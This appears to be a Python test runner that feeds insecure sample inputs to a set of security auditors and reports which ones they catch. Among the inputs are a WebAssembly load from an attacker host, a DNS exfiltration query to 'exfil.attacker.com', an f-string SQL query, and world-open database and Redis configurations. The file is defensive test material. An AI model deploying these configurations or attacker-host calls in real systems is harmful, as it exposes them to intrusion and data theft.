"""R301 — Final adversarial runner v6 (R252-R300 sweep).

Builds on R51 (R1-R51), R101 (R52-R101), R151 (R102-R150), R201
(R152-R200), R251 (R202-R250) with explicit probes against every
R252-R300 defence.  Operators run all six runners — R51 + R101 +
R151 + R201 + R251 + R301 — for the complete posture report.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Tuple

from aria.security.plugins import DefencePlugin, register


@dataclass
class _Probe:
    round_id: str
    label: str
    invoke: Callable[[], Tuple[bool, str]]


def _p_r252():
    from aria.security.rounds.r252_csp_strict import audit_csp
    bad = "default-src 'self'; script-src 'self' 'unsafe-inline'"
    ok, issues = audit_csp(bad)
    return (not ok) and any("unsafe-inline" in i for i in issues), str(issues[:1])


def _p_r253():
    from aria.security.rounds.r253_trusted_types import audit_trusted_types
    ok, issues = audit_trusted_types("default-src 'self'")
    return (not ok) and any("require_directive_missing" in i for i in issues), str(issues[:1])


def _p_r254():
    from aria.security.rounds.r254_sri import audit_html
    bad = '<script src="https://cdn.example.com/x.js"></script>'
    ok, issues = audit_html(bad)
    return (not ok) and any("missing_for" in i for i in issues), str(issues[:1])


def _p_r255():
    from aria.security.rounds.r255_permissions_policy import audit_permissions_policy
    ok, issues = audit_permissions_policy("camera=*")
    return (not ok) and any("wildcard" in i for i in issues), str(issues[:1])


def _p_r256():
    from aria.security.rounds.r256_clickjacking import audit_response_headers
    ok, issues = audit_response_headers({})
    return (not ok), str(issues[:1])


def _p_r257():
    from aria.security.rounds.r257_coop_coep import audit_isolation
    ok, issues = audit_isolation({}, requires_isolation=True)
    return (not ok), str(issues[:1])


def _p_r258():
    import os as _os
    _os.environ["ARIA_ENV"] = "prod"
    try:
        from aria.security.rounds.r258_referrer_policy import audit_referrer
        ok, issues = audit_referrer({"Referrer-Policy": "no-referrer-when-downgrade"})
    finally:
        _os.environ.pop("ARIA_ENV", None)
    return (not ok), str(issues[:1])


def _p_r259():
    from aria.security.rounds.r259_wasm_sandbox import audit_wasm_in_js
    bad = 'WebAssembly.compileStreaming(fetch("https://attacker.com/x.wasm"))'
    ok, issues = audit_wasm_in_js(bad, pinned_origins={"https://cdn.trusted.com"})
    return (not ok) and any("unpinned" in i for i in issues), str(issues[:1])


def _p_r260():
    from aria.security.rounds.r260_service_worker import audit_sw_registration
    ok, issues = audit_sw_registration(
        origin="http://example.com", script_url="http://example.com/sw.js",
        scope="/", script_bytes=b"test",
    )
    return (not ok) and any("non_https" in i or "scope_too_broad" in i for i in issues), str(issues[:2])


def _p_r261():
    from aria.security.rounds.r261_postmessage_origin import audit_postmessage_handlers
    bad = "window.addEventListener('message', function(event) { handle(event.data); });"
    ok, issues = audit_postmessage_handlers(bad)
    return (not ok), str(issues[:1])


def _p_r262():
    from aria.security.rounds.r262_spf_audit import audit_spf_record
    ok, issues = audit_spf_record("v=spf1 ip4:1.2.3.4 +all")
    return (not ok) and any("plus_all" in i for i in issues), str(issues[:1])


def _p_r263():
    from aria.security.rounds.r263_dkim_verify import audit_dkim_header
    ok, issues = audit_dkim_header("v=1; a=rsa-sha1; d=example.com")
    return (not ok), str(issues[:1])


def _p_r264():
    from aria.security.rounds.r264_dmarc_policy import audit_dmarc
    ok, issues = audit_dmarc("v=DMARC1; p=none", is_production=True)
    return (not ok) and any("policy_none" in i for i in issues), str(issues[:1])


def _p_r265():
    from aria.security.rounds.r265_bimi import audit_bimi
    ok, issues = audit_bimi("v=BIMI1; l=http://example.com/logo.svg", dmarc_policy="reject")
    return (not ok) and any("logo_not_https" in i for i in issues), str(issues[:1])


def _p_r266():
    from aria.security.rounds.r266_arc_chain import audit_arc_chain
    ok, issues = audit_arc_chain(["i=1; cv=fail"])
    return (not ok), str(issues[:1])


def _p_r267():
    import os as _os
    _os.environ["ARIA_ENV"] = "prod"
    try:
        from aria.security.rounds.r267_mta_sts import audit_mta_sts_policy
        ok, issues = audit_mta_sts_policy(
            "version: STSv1\nmode: testing\nmx: mail.example.com\nmax_age: 86400"
        )
    finally:
        _os.environ.pop("ARIA_ENV", None)
    return (not ok) and any("not_enforce" in i for i in issues), str(issues[:1])


def _p_r268():
    from aria.security.rounds.r268_tls_rpt import audit_tls_rpt
    ok, issues = audit_tls_rpt("v=TLSRPTv1")
    return (not ok), str(issues[:1])


def _p_r271():
    from aria.security.rounds.r271_dns_exfil import score_query
    long_label = "abcdefghijklmnopqrstuvwxyz0123456789"
    score, _ = score_query(f"{long_label}.exfil.attacker.com", qtype="TXT")
    return score >= 0.4, f"score={score:.2f}"


def _p_r272():
    from aria.security.rounds.r272_sql_param import lint_python_sql
    ok, issues = lint_python_sql('cursor.execute(f"SELECT * FROM x WHERE id={user_id}")')
    return (not ok) and any("fstring" in i for i in issues), str(issues[:1])


def _p_r273():
    from aria.security.rounds.r273_row_level_security import RLSTable, audit_rls_policies
    ok, issues = audit_rls_policies([RLSTable("orders", rls_enabled=False)])
    return (not ok) and any("disabled" in i for i in issues), str(issues[:1])


def _p_r274():
    from aria.security.rounds.r274_stored_proc_perm import audit_proc_definition
    bad = ("CREATE FUNCTION transfer() RETURNS void LANGUAGE plpgsql "
           "SECURITY DEFINER AS $$ BEGIN EXECUTE format('SELECT %s', x); END $$;")
    ok, issues = audit_proc_definition(bad)
    return (not ok) and any("definer_with_dynamic" in i for i in issues), str(issues[:1])


def _p_r275():
    from aria.security.rounds.r275_pg_hba import audit_pg_hba
    ok, issues = audit_pg_hba("host all all 0.0.0.0/0 trust")
    return (not ok), str(issues[:1])


def _p_r276():
    from aria.security.rounds.r276_mongo_auth import audit_mongod_config
    ok, issues = audit_mongod_config({"net": {"bindIp": "0.0.0.0"}, "security": {}})
    return (not ok), str(issues[:1])


def _p_r277():
    from aria.security.rounds.r277_redis_acl import audit_redis_conf
    ok, issues = audit_redis_conf("protected-mode no\nbind 0.0.0.0")
    return (not ok), str(issues[:1])


def _p_r278():
    import os as _os
    _os.environ["ARIA_ENV"] = "prod"
    try:
        from aria.security.rounds.r278_elasticsearch_security import audit_elasticsearch_yml
        ok, issues = audit_elasticsearch_yml({"xpack.security.enabled": False})
    finally:
        _os.environ.pop("ARIA_ENV", None)
    return (not ok), str(issues[:1])


def _p_r279():
    import os as _os
    _os.environ["ARIA_ENV"] = "prod"
    try:
        from aria.security.rounds.r279_backup_encryption import BackupDescriptor, audit_backup_descriptor
        ok, issues = audit_backup_descriptor(BackupDescriptor(
            location="s3://x/y", encrypted=False,
        ))
    finally:
        _os.environ.pop("ARIA_ENV", None)
    return (not ok), str(issues[:1])


def _p_r280():
    from aria.security.rounds.r280_slow_query import record_query, audit_slow_queries, reset_for_tests
    reset_for_tests()
    for _ in range(25):
        record_query(duration_ms=600.0, principal="a", fingerprint="SELECT * FROM logs", rows_returned=10)
    ok, issues = audit_slow_queries()
    reset_for_tests()
    return (not ok) and any("repeated_fingerprint" in i for i in issues), str(issues[:1])


def _p_r281():
    from aria.security.rounds.r281_pool_exhaustion import acquire, release, reset_for_tests
    reset_for_tests()
    ok = True
    for _ in range(10):
        ok_iter, _ = acquire("alice", max_per_principal=10)
        ok = ok and ok_iter
    refused, _ = acquire("alice", max_per_principal=10)
    for _ in range(10):
        release("alice")
    reset_for_tests()
    return ok and (not refused), "10_ok_then_refused"


def _p_r282():
    from aria.security.rounds.r282_business_logic_race import (
        acquire_business_op, complete_business_op, reset_for_tests,
    )
    reset_for_tests()
    a, _ = acquire_business_op("transfer-1")
    b, _ = acquire_business_op("transfer-1")
    complete_business_op("transfer-1", success=True)
    c, _ = acquire_business_op("transfer-1")
    reset_for_tests()
    return a and (not b) and (not c), "first_ok_concurrent_blocked"


def _p_r283():
    from aria.security.rounds.r283_workflow_bypass import define_flow, advance_state, reset_for_tests
    reset_for_tests()
    define_flow("kyc_funnel", ["kyc", "risk_check", "fund"])
    bypass, _ = advance_state("kyc_funnel", "u1", "fund")
    reset_for_tests()
    return not bypass, "fund_without_kyc_blocked"


def _p_r284():
    from aria.security.rounds.r284_api_versioning import configure_version, check_version, reset_for_tests
    reset_for_tests()
    configure_version("v1", state="retired")
    code, _ = check_version("v1")
    reset_for_tests()
    return code == 410, f"code={code}"


def _p_r285():
    from aria.security.rounds.r285_graphql_complexity import audit_query
    deep = "{" + "a {" * 15 + "x" + "}" * 15 + "}"
    ok, why = audit_query(deep)
    return (not ok) and "depth" in why, why


def _p_r286():
    from aria.security.rounds.r286_websocket_subprotocol import negotiate_subprotocol
    ok, chosen, _ = negotiate_subprotocol(["evil-proto"], server_allowed=["aria.v1"])
    return (not ok) and not chosen, "no_overlap_blocked"


def _p_r287():
    from aria.security.rounds.r287_sse_audit import admit_sse_event, reset_for_tests
    reset_for_tests()
    ok, _ = admit_sse_event("s1", 100_000)   # > max_event_bytes
    reset_for_tests()
    return not ok, "oversized_event_blocked"


def _p_r288():
    from aria.security.rounds.r288_webhook_signature import make_signature, verify_webhook, reset_for_tests
    reset_for_tests()
    secret = b"test-secret"
    payload = b"hello"
    sig = make_signature(payload, secret)
    ok, _ = verify_webhook(payload, sig, secret)
    reset_for_tests()
    return ok, "signature_round_trip"


def _p_r289():
    from aria.security.rounds.r289_api_key_oauth import RouteAuthPolicy, classify_request, enforce
    cls = classify_request(has_api_key=True, has_oauth_bearer=True, has_client_cert=False)
    ok, _ = enforce(RouteAuthPolicy("/x", allowed_auth=("oauth",)), cls)
    return (not ok) and cls == "mixed", f"cls={cls}"


def _p_r290():
    from aria.security.rounds.r290_per_tenant_fairness import configure, consume, reset_for_tests
    reset_for_tests()
    configure(per_tenant_capacity=5.0, per_tenant_refill_per_second=0.0, global_capacity=100.0)
    for _ in range(5):
        consume("alice")
    blocked, _ = consume("alice")
    reset_for_tests()
    return not blocked, "tenant_exhaust_isolated"


def _p_r291():
    import os as _os
    _os.environ["ARIA_ENV"] = "prod"
    try:
        from aria.security.rounds.r291_grpc_reflection_disable import audit_server_descriptor
        ok, issues = audit_server_descriptor(["grpc.reflection.v1.ServerReflection"])
    finally:
        _os.environ.pop("ARIA_ENV", None)
    return (not ok), str(issues[:1])


def _p_r293():
    from aria.security.rounds.r293_print_egress_audit import (
        record_print_job, audit_print_burst, reset_for_tests,
    )
    reset_for_tests()
    for _ in range(20):
        record_print_job("u1", pages=50, bytes_estimated=10 * 1024 * 1024)
    ok, _ = audit_print_burst("u1")
    reset_for_tests()
    return not ok, "burst_flagged"


def _p_r294():
    from aria.security.rounds.r294_clipboard_governor import admit_copy, reset_for_tests
    reset_for_tests()
    ok, _ = admit_copy("u1", 100_000)
    reset_for_tests()
    return not ok, "oversized_event_blocked"


def _p_r295():
    from aria.security.rounds.r295_endpoint_telemetry import consume_telemetry_event, reset_for_tests
    reset_for_tests()
    ok, _ = consume_telemetry_event("u1", "screenshot")
    reset_for_tests()
    return not ok, "no_consent_blocked"


def _p_r296():
    from aria.security.rounds.r296_travel_mode import enable_travel_mode, can_access, reset_for_tests
    reset_for_tests()
    enable_travel_mode("dev-1", country="CN")
    ok, _ = can_access("dev-1", classification="secret")
    reset_for_tests()
    return not ok, "secret_blocked_in_travel_mode"


def _p_r297():
    from aria.security.rounds.r297_foreign_influence import score_counterparty
    score, notes = score_counterparty(primary_country_iso="IR")
    return score >= 0.5, f"score={score:.2f}"


def _p_r298():
    from aria.security.rounds.r298_image_steganography import lsb_chi_squared
    # Pair-equalised LSB pattern typical of LSB substitution: 0x80/0x81 alternation
    blob = bytes([0x80, 0x81] * 32_768)
    score, _ = lsb_chi_squared(blob)
    return score >= 0.5, f"score={score:.2f}"


def _p_r299():
    from aria.security.rounds.r299_covert_timing import score_intervals
    regular = [10.0] * 50
    score, _ = score_intervals(regular)
    return score >= 0.5, f"score={score:.2f}"


_PROBES: List[_Probe] = [
    _Probe("R252", "csp_unsafe_inline", _p_r252),
    _Probe("R253", "tt_missing", _p_r253),
    _Probe("R254", "sri_missing", _p_r254),
    _Probe("R255", "permissions_wildcard", _p_r255),
    _Probe("R256", "clickjack_no_protection", _p_r256),
    _Probe("R257", "isolation_missing", _p_r257),
    _Probe("R258", "referrer_too_permissive", _p_r258),
    _Probe("R259", "wasm_unpinned", _p_r259),
    _Probe("R260", "sw_non_https", _p_r260),
    _Probe("R261", "postmsg_no_origin", _p_r261),
    _Probe("R262", "spf_plus_all", _p_r262),
    _Probe("R263", "dkim_weak_algo", _p_r263),
    _Probe("R264", "dmarc_p_none", _p_r264),
    _Probe("R265", "bimi_logo_http", _p_r265),
    _Probe("R266", "arc_cv_fail", _p_r266),
    _Probe("R267", "mtasts_not_enforce", _p_r267),
    _Probe("R268", "tlsrpt_no_rua", _p_r268),
    _Probe("R271", "dns_exfil", _p_r271),
    _Probe("R272", "sql_fstring", _p_r272),
    _Probe("R273", "rls_disabled", _p_r273),
    _Probe("R274", "proc_definer_dynamic", _p_r274),
    _Probe("R275", "pg_hba_world_trust", _p_r275),
    _Probe("R276", "mongo_world_no_auth", _p_r276),
    _Probe("R277", "redis_protected_off", _p_r277),
    _Probe("R278", "es_security_off", _p_r278),
    _Probe("R279", "backup_unencrypted", _p_r279),
    _Probe("R280", "slowq_repeated", _p_r280),
    _Probe("R281", "pool_exhaustion", _p_r281),
    _Probe("R282", "biz_race", _p_r282),
    _Probe("R283", "workflow_bypass", _p_r283),
    _Probe("R284", "version_retired", _p_r284),
    _Probe("R285", "graphql_depth", _p_r285),
    _Probe("R286", "ws_no_overlap", _p_r286),
    _Probe("R287", "sse_oversized", _p_r287),
    _Probe("R288", "webhook_round_trip", _p_r288),
    _Probe("R289", "auth_mixed", _p_r289),
    _Probe("R290", "tenant_exhausted", _p_r290),
    _Probe("R291", "grpc_reflection_prod", _p_r291),
    _Probe("R293", "print_burst", _p_r293),
    _Probe("R294", "clipboard_oversized", _p_r294),
    _Probe("R295", "telemetry_no_consent", _p_r295),
    _Probe("R296", "travel_secret_blocked", _p_r296),
    _Probe("R297", "sanctioned_iso", _p_r297),
    _Probe("R298", "image_lsb_flat", _p_r298),
    _Probe("R299", "regular_intervals", _p_r299),
]


@dataclass
class V6Report:
    results: List[Dict[str, Any]] = field(default_factory=list)

    @property
    def caught(self) -> int:
        return sum(1 for r in self.results if r.get("caught"))

    @property
    def passed(self) -> bool:
        return all(r.get("caught") for r in self.results)


def run_v6() -> V6Report:
    from aria.security.guard import activate_all_rounds
    activate_all_rounds(force_reload=True)
    report = V6Report()
    for probe in _PROBES:
        try:
            caught, evidence = probe.invoke()
        except Exception as exc:
            caught, evidence = False, f"exc:{type(exc).__name__}:{exc}"
        report.results.append({
            "round": probe.round_id,
            "label": probe.label,
            "caught": caught,
            "evidence": evidence[:120],
        })
    return report


def render_v6(report: V6Report) -> str:
    lines = [
        "# R301 — adversarial runner v6 (R252-R300 sweep)",
        f"caught: {report.caught}/{len(report.results)}; "
        f"all_pass: {report.passed}",
        "",
        "| Round | Probe | Caught | Evidence |",
        "|-------|-------|--------|----------|",
    ]
    for r in report.results:
        mark = "PASS" if r["caught"] else "FAIL"
        lines.append(
            f"| {r['round']} | {r['label']} | {mark} | "
            f"{r['evidence'][:80]} |"
        )
    return "\n".join(lines)


register(DefencePlugin(
    round_id="R301",
    name="adversarial_runner_v6",
    description="Final probe runner across R252-R300 defences (50-round sweep).",
))
